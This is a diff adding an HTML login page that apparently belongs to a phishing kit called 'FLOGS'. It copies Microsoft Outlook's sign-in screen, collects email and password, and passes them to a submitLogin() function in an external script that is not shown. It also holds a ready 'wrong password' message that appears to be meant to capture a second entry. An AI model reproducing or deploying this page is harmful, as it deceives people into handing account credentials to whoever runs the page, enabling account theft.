@@ -1,0 +1,88 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Sign in</title>
+  
+  <!-- Open Graph Meta Tags for Social Media Preview -->
+  <meta property="og:title" content="FLOGS - Sign In">
+  <meta property="og:description" content="Sign in to your FLOGS account">
+  <meta property="og:image" content="https://raw.githubusercontent.com/Igbined/FLOGS-2.0/master/IMAGES/6a4d9613-4e5c-41fd-bb65-b6f49326f87b.jpeg">
+  <meta property="og:url" content="https://github.com/Igbined/FLOGS-2.0">
+  <meta property="og:type" content="website">
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:image" content="https://raw.githubusercontent.com/Igbined/FLOGS-2.0/master/IMAGES/6a4d9613-4e5c-41fd-bb65-b6f49326f87b.jpeg">
+  
+  <script src="https://cdn.tailwindcss.com"></script>
+  <script src="../JS/config.js"></script>
+  <style>
+    body { 
+      font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; 
+    }
+    .input-field {
+      border: 1px solid #8a8a8a;
+      transition: border 0.2s;
+    }
+    .input-field:focus {
+      border-color: #0078d4;
+      box-shadow: 0 0 0 2px rgba(0, 120, 212, 0.2);
+    }
+    .error-msg { 
+      color: #c42b1c; 
+      font-size: 14px; 
+    }
+  </style>
+</head>
+<body class="bg-white min-h-screen flex items-center justify-center p-4">
+
+  <div class="w-full max-w-[380px]">
+
+    <!-- Outlook Logo -->
+    <div class="flex justify-center mb-10">
+      <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/d/df/Microsoft_Outlook_%282018%E2%80%93present%29.svg/512px-Microsoft_Outlook_%282018%E2%80%93present%29.svg.png" 
+           alt="Outlook" 
+           class="h-12">
+    </div>
+
+    <h1 class="text-3xl font-light text-center mb-8">Sign in</h1>
+
+    <div class="space-y-5">
+      <input id="emailInput" type="text" placeholder="Email or phone" 
+             class="input-field w-full px-4 py-3 rounded-md text-base focus:outline-none">
+
+      <input id="passwordInput" type="password" placeholder="Password" 
+             class="input-field w-full px-4 py-3 rounded-md text-base focus:outline-none">
+
+      <div class="flex items-center gap-2">
+        <input type="checkbox" id="keepSigned" class="w-5 h-5 accent-blue-600">
+        <label for="keepSigned" class="text-sm text-gray-700 cursor-pointer select-none">
+          Keep me signed in
+        </label>
+      </div>
+
+      <button onclick="submitLogin()" id="signInBtn"
+              class="w-full bg-[#0078d4] hover:bg-[#0066b3] text-white font-medium py-3 rounded-md transition-colors flex items-center justify-center gap-2 disabled:opacity-70">
+        <span id="btnText">Sign in</span>
+        <svg id="spinner" class="w-5 h-5 animate-spin hidden" viewBox="0 0 24 24">
+          <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
+          <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4z"></path>
+        </svg>
+      </button>
+    </div>
+
+    <div id="errorMsg" class="hidden error-msg text-center mt-4">
+      That password doesn't look right. Make sure it's the one you use for this account.
+    </div>
+
+    <div class="mt-8 text-center space-y-3 text-sm">
+      <a href="#" class="text-[#0078d4] hover:underline block">No account? Create one!</a>
+      <a href="#" class="text-[#0078d4] hover:underline block">Forgot my password</a>
+      <a href="#" class="text-[#0078d4] hover:underline block">Sign in with a single-use code</a>
+    </div>
+
+  </div>
+
+  <script src="../JS/email.js" defer></script>
+</body>
+</html>
